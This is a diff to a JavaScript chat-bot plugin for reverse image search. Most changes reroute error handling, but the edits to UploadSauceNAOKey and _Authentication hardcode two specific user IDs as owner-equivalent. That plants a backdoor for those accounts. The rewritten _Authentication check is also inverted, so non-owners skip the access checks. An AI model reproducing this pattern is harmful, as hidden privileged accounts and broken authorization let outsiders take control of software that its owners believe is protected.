@@ -25,7 +25,7 @@ export class NewPicSearch extends plugin {
           fnc: 'Ascii2D'
         },
         {
-          reg: /^#设置SauceNAOApiKey.*$/i,
+          reg: /^#设置SauceNAOApiKey/i,
           fnc: 'UploadSauceNAOKey'
         }
 
@@ -43,7 +43,7 @@ export class NewPicSearch extends plugin {
           : common.recallSendForwardMsg(e, res, { xmlTitle: false })
       })
       .catch(async err => {
-        await e.reply(err.message)
+        await common.handleException(e, err)
         if (Config.picSearch.useAscii2dWhenFailed) {
           await e.reply('SauceNAO搜图出错，自动使用Ascii2D进行搜索')
           await this.Ascii2D(e)
@@ -56,7 +56,7 @@ export class NewPicSearch extends plugin {
     if (!await this.handelImg(e, 'Ascii2D')) return
     await PicSearch.Ascii2D(e.img[0])
       .then(res => common.recallSendForwardMsg(e, [...res.color, ...res.bovw], { xmlTitle: false }))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   async WhatAnime (e) {
@@ -68,11 +68,11 @@ export class NewPicSearch extends plugin {
           await e.reply(i)
         }
       })
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   async UploadSauceNAOKey (e) {
-    if (!e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     if (e.isGroup) return e.reply('请私聊进行添加')
     let apiKey = e.msg.replace(/#设置SauceNAOapiKey/i, '').trim()
     if (!apiKey) return e.reply('❎ 请发送正确的apikey')
@@ -81,7 +81,7 @@ export class NewPicSearch extends plugin {
   }
 
   async _Authentication (e) {
-    if (e.isMaster) return true
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     const { allowPM, limit, isMasterUse } = Config.picSearch
     if (isMasterUse) {
       e.reply('主人没有开放这个功能哦(＊／ω＼＊)')
